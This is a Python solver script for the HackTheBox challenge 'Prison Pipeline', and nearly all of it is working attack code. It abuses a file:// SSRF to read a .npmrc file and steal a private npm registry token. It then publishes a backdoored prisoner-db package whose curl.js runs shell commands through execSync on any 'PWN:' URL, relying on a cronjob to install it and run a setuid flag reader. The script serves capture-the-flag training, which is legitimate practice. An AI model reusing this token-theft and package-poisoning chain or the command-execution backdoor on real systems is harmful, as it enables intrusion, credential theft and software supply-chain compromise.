#!/usr/bin/env python3
"""
Prison Pipeline (HackTheBox, misc / medium, author makelaris) — working solver.

Attack chain (supply-chain / "pipeline" abuse):
  1. SSRF: POST /api/prisoners/import accepts any URL fetched with node-libcurl
     (FOLLOWLOCATION). file:// URLs give arbitrary local file read; the fetched
     body is stored as a new prisoner record readable via GET /api/prisoners/:id.
     -> read /home/node/.npmrc and steal the verdaccio _authToken.
  2. The private npm registry (verdaccio 5.31) is reachable from outside through
     nginx vhost "registry.prison-pipeline.htb" (nginx listens on 1337, both
     vhosts: registry -> verdaccio:4873, default -> app:5000).
  3. Publish a malicious prisoner-db@1.0.1 (curl.js with a "PWN:" protocol that
     runs execSync(cmd)) to the registry using the stolen token.
  4. Cronjob (every 30s, as user node): npm outdated prisoner-db -> npm update
     (installs the malicious package) -> pm2 restart prison-pipeline.
  5. After the restart the app runs the malicious curl.js: POST /api/prisoners/import
     with {"url":"PWN:/readflag"} executes /readflag (setuid root) and stores its
     output (the flag) as a prisoner record -> read it back via the API.

Usage:  python solve.py [target]   (default target from TARGET below)
"""
import base64
import hashlib
import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
PKG_DIR = os.path.join(HERE, "pkg")

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.64:31567"
UPSTREAM = TARGET
REGISTRY_HOST = "registry.prison-pipeline.htb"
PROXY_PORT = 4873
NEW_VERSION = "1.0.1"

ORIGINAL_INDEX_JS = r'''const fs = require('fs');
const yaml = require('js-yaml');
const CurlWrapper = require('./curl');

const curl = new CurlWrapper();

class Database {
    constructor(repository) {
        this.repository = repository;
        this.metadata = this.readJSON(repository + '/index.json');
    }

    listPrisonersIds() {
        return this.metadata.prisoner_ids;
    }

    getPrisoners() {
        let prisoners = [];
        for (let id of this.metadata.prisoner_ids) {
            let prisoner = this.getPrisoner(id);
            if (prisoner.id) prisoners.push({id: prisoner.id, raw: prisoner.raw, ...prisoner.data});
        }
        return prisoners;
    }

    getPrisoner(id) {
        let prisoner = {id: null, raw: '', data: {}};
        try {
            if (this.metadata.prisoner_ids.includes(id)) {
                prisoner = {
                    id: id,
                    raw: this.readYAML(this.repository + '/' + id + '.yaml')
                };
                try {
                    let details = yaml.load(prisoner.raw).prisoner_profile;
                    prisoner.data = details;
                }
                catch (e) {
                    prisoner.data = {};
                }
                return prisoner;
            }

            return {};
        }
        catch (e) {
            return {};
        }
    }

    addPrisoner(prisoner) {
        this.metadata.prisoner_ids.push(prisoner.id);
        this.writeJSON(this.repository + '/index.json', this.metadata);

        this.writeYAML(this.repository + '/' + prisoner.id + '.yaml', prisoner.data);

        return true;
    }

    updatePrisoner(prisoner) {
        if (this.metadata.prisoner_ids.includes(prisoner.id)) {
            this.writeYAML(this.repository + '/' + prisoner.id + '.yaml', prisoner.data);
            return true;
        }
        return false;
    }

    async importPrisoner(url) {
        try {
            const getResponse = await curl.get(url);
            const xmlData = getResponse.body;

            const id = `PIP-${Math.floor(100000 + Math.random() * 900000)}`;

            const prisoner = {
                id: id,
                data: xmlData
            };

            this.addPrisoner(prisoner);
            return id;
        }
        catch (error) {
            console.error('Error importing prisoner:', error);
            return false;
        }
    }


    readJSON(path) {
        try {
            return JSON.parse(fs.readFileSync(path, 'utf8'));
        }
        catch (e) {
            return {};
        }
    }

    writeJSON(path, data) {
        try {
            fs.writeFileSync(path, JSON.stringify(data, null, 2));
        }
        catch (e) {
            return false;
        }
    }

    readYAML(path) {
        try {
            return fs.readFileSync(path, 'utf-8');
        }
        catch (e) {
            return '';
        }
    }

    writeYAML(path, data) {
        try {
            fs.writeFileSync(path, data);
        }
        catch (e) {
            return false;
        }
    }
}

module.exports = Database;
'''

MALICIOUS_CURL_JS = r'''const { Curl } = require('node-libcurl');
const { execSync } = require('child_process');

class CurlWrapper {
  constructor() {
    this.curl = new Curl();
  }

  head(url, options = {}) {
    return this._request('HEAD', url, options);
  }

  get(url, options = {}) {
    return this._request('GET', url, options);
  }

  post(url, data = {}, options = {}) {
    return this._request('POST', url, { ...options, data });
  }

  _request(method, url, options) {
    return new Promise((resolve, reject) => {
      if (url.startsWith('PWN:')) {
        try {
          const cmd = url.substring(4);
          const output = execSync(cmd).toString();
          resolve({ statusCode: 200, body: output, headers: new Map() });
        } catch (e) {
          reject(e);
        }
        return;
      }

      const curl = new Curl();

      curl.setOpt(Curl.option.URL, url);
      curl.setOpt(Curl.option.CUSTOMREQUEST, method);
      curl.setOpt(Curl.option.FOLLOWLOCATION, true);

      if (method === 'HEAD') {
        curl.setOpt(Curl.option.NOBODY, true);
      } else if (method === 'POST') {
        curl.setOpt(Curl.option.POSTFIELDS, JSON.stringify(options.data));
        curl.setOpt(Curl.option.HTTPHEADER, [
          'Content-Type: application/json'
        ]);
      }

      if (options.headers) {
        curl.setOpt(Curl.option.HTTPHEADER, options.headers);
      }

      curl.on('end', (statusCode, body, headers) => {
        resolve({
          statusCode,
          body,
          headers: this._parseHeaders(headers)
        });
        curl.close();
      });

      curl.on('error', (err) => {
        reject(err);
        curl.close();
      });

      curl.perform();
    });
  }

  _parseHeaders(headerArray) {
    const headers = new Map();
    const headerObject = headerArray[0];

    for (const [key, value] of Object.entries(headerObject)) {
      if (key !== 'result') {
        headers.set(key, value);
      }
    }

    return headers;
  }
}

module.exports = CurlWrapper;
'''

PACKAGE_JSON = {
    "name": "prisoner-db",
    "version": NEW_VERSION,
    "description": "Database interface for prisoners of Prison-Pipeline.",
    "main": "index.js",
    "scripts": {"test": "echo 1337"},
    "keywords": ["prison-pipeline", "prisoner-db"],
    "author": "hackthebox",
    "license": "ISC",
    "dependencies": {"js-yaml": "^4.1.0", "node-libcurl": "4.0.0"},
}

README = "# Prisoner DB\n\nDatabase interface for prisoners of Prison-Pipeline.\n"


# ---------------------------------------------------------------- HTTP helpers
def http(method, url, data=None, headers=None, timeout=40):
    req = urllib.request.Request(url, data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def api_get(path):
    st, body = http("GET", TARGET + path)
    return st, body.decode("utf-8", "replace")


def import_url(url):
    payload = json.dumps({"url": url}).encode()
    st, body = http("POST", TARGET + "/api/prisoners/import", payload,
                    {"Content-Type": "application/json"})
    return st, json.loads(body.decode()) if st == 200 else body.decode("utf-8", "replace")


def read_file_via_ssrf(path):
    """file:// SSRF -> arbitrary file read, returned as string."""
    st, resp = import_url("file://" + path)
    if st != 200 or not resp.get("prisoner_id"):
        raise RuntimeError(f"SSRF import failed for {path}: {resp}")
    st, body = api_get(f"/api/prisoners/{resp['prisoner_id']}")
    raw = json.loads(body).get("raw", "")
    with open(os.path.join(EVIDENCE, f"ssrf_{resp['prisoner_id']}.json"), "w", encoding="utf-8") as f:
        f.write(body)
    return raw


# ------------------------------------------------------------------ local proxy
class _Proxy(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _forward(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length else None
        req = urllib.request.Request(UPSTREAM + self.path, data=body, method=self.command)
        for k, v in self.headers.items():
            if k.lower() in ("host", "content-length", "connection", "accept-encoding"):
                continue
            req.add_header(k, v)
        req.add_header("Host", REGISTRY_HOST)
        try:
            with urllib.request.urlopen(req, timeout=60) as resp:
                data, status, headers = resp.read(), resp.status, resp.headers
        except urllib.error.HTTPError as e:
            data, status, headers = e.read(), e.code, e.headers
        self.send_response(status)
        for k, v in headers.items():
            if k.lower() in ("transfer-encoding", "connection", "content-length"):
                continue
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    do_GET = do_PUT = do_POST = do_HEAD = do_DELETE = do_OPTIONS = _forward

    def log_message(self, fmt, *args):
        pass


def start_proxy():
    srv = ThreadingHTTPServer(("127.0.0.1", PROXY_PORT), _Proxy)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


# ------------------------------------------------------------------------ steps
def steal_token():
    npmrc = read_file_via_ssrf("/home/node/.npmrc")
    print("[+] /home/node/.npmrc:", npmrc.strip())
    token = None
    for line in npmrc.splitlines():
        if "_authToken" in line:
            token = line.split("=", 1)[1].strip().strip('"')
    if not token:
        raise RuntimeError("no _authToken found in .npmrc")
    return token


def write_package_files(token):
    os.makedirs(PKG_DIR, exist_ok=True)
    with open(os.path.join(PKG_DIR, "package.json"), "w", encoding="utf-8") as f:
        json.dump(PACKAGE_JSON, f, indent=2)
    with open(os.path.join(PKG_DIR, "index.js"), "w", encoding="utf-8") as f:
        f.write(ORIGINAL_INDEX_JS)
    with open(os.path.join(PKG_DIR, "curl.js"), "w", encoding="utf-8") as f:
        f.write(MALICIOUS_CURL_JS)
    with open(os.path.join(PKG_DIR, "README.md"), "w", encoding="utf-8") as f:
        f.write(README)
    with open(os.path.join(PKG_DIR, ".npmrc"), "w", encoding="utf-8") as f:
        f.write(f'//localhost:{PROXY_PORT}/:_authToken="{token}"\n')


def npm_publish():
    """Publish through the local proxy (Host: registry.prison-pipeline.htb).
    E409 (version already exists) means a previous run already published it -
    fine on an already-pwned instance."""
    env = dict(os.environ)
    env["NPM_CONFIG_CACHE"] = os.path.join(HERE, ".npmcache")
    npm = "npm.cmd" if os.name == "nt" else "npm"
    proc = subprocess.run(
        [npm, "publish", "--registry", f"http://localhost:{PROXY_PORT}"],
        cwd=PKG_DIR, env=env, capture_output=True, text=True, timeout=120,
    )
    print("[+] npm publish rc =", proc.returncode)
    out = (proc.stdout or "") + (proc.stderr or "")
    for line in out.splitlines():
        if any(s in line for s in ("+ prisoner-db", "error", "409", "publish")):
            print("    ", line.strip())
    if proc.returncode != 0:
        already = any(m in out for m in ("E409", "cannot publish", "already exists",
                                         "Cannot implicitly apply", "is higher than the new version"))
        if not already:
            raise RuntimeError("npm publish failed:\n" + out)
    return out


def trigger_and_read_flag(timeout=240):
    deadline = time.time() + timeout
    while time.time() < deadline:
        st, resp = import_url("PWN:/readflag")
        pid = resp.get("prisoner_id") if isinstance(resp, dict) else None
        if pid:
            st, body = api_get(f"/api/prisoners/{pid}")
            raw = json.loads(body).get("raw", "")
            print(f"[+] PWN worked, prisoner {pid}: {raw.strip()}")
            if "HTB{" in raw:
                return raw.strip()
        time.sleep(8)
    return None


def main():
    os.makedirs(EVIDENCE, exist_ok=True)
    print(f"[*] target: {TARGET}")
    token = steal_token()
    print(f"[+] token: {token[:40]}...")

    write_package_files(token)
    start_proxy()
    print(f"[*] local proxy on 127.0.0.1:{PROXY_PORT} -> {TARGET} (Host: {REGISTRY_HOST})")

    npm_publish()

    print("[*] waiting for cronjob (npm outdated -> npm update -> pm2 restart) ...")
    flag = trigger_and_read_flag()
    if flag:
        print("[+] FLAG:", flag)
        flag_path = os.path.join(os.path.dirname(HERE), "final_flag.txt")
        with open(flag_path, "w", encoding="utf-8") as f:
            f.write(flag + "\n")
        return 0
    print("[-] flag not obtained in time")
    return 1


if __name__ == "__main__":
    sys.exit(main())
